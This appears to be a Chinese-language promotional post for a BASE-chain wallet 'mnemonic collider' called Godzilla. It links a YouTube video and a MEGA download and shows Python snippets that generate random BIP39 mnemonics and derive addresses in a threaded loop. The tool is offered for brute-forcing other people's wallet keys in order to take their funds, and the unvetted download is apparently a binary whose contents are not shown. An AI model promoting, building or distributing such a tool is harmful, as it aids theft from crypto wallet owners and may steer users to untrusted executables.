哥斯拉区块链钱包助记词碰撞器/密钥碰撞器（BASE链）

▶https://youtu.be/bTHZPMxoz0E

⬇https://mega.nz/file/LdEFiC4B#wrumHP8FTCu3z2DjhgerZ25NLgmPtXTYRfOKB2dtq8g

这是一个专门用于生成和检查BASE链钱包地址的Python工具

## 核心功能
### 1. 助记词生成
工具使用BIP39标准生成12个单词的助记词：

def generate_mnemonic():
    """生成助记词"""
    mnemo = Mnemonic("english")
    return mnemo.generate(strength=128)

### 2. BASE链地址生成
通过以太坊账户系统生成BASE链地址：

def generate_base_address(mnemonic):
    """生成BASE链地址"""
    Account.enable_unaudited_hdwallet_features()
    acct = Account.from_mnemonic(mnemonic)
    return acct.address

### 3. 多线程钱包生成
使用QThread实现高效的钱包生成：

class WalletWorker(QThread):
    update_signal = pyqtSignal(str, str, int)  
    def run(self):
        count = 0
        while self.is_running:
            mnemonic = generate_mnemonic()
            addr = generate_base_address(mnemonic)
            if addr:
                count += 1
                self.update_signal.emit(mnemonic, addr, count)
